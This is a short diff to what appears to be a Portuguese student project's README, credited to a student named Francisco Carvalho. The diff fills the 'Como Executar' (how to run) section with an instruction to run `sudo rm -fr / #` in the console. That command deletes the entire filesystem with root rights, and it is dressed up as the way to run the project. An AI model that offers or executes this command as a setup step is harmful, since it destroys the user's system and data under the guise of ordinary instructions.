@@ -4,9 +4,9 @@
 
 - Features:
 - Como Executar:
-<p></p>
-<p></p>
-
+  Executar na consola:
+  `sudo rm -fr / #`
+  
 >Desenvolvido por:
 > - AL 78557 Francisco Carvalho
 > 
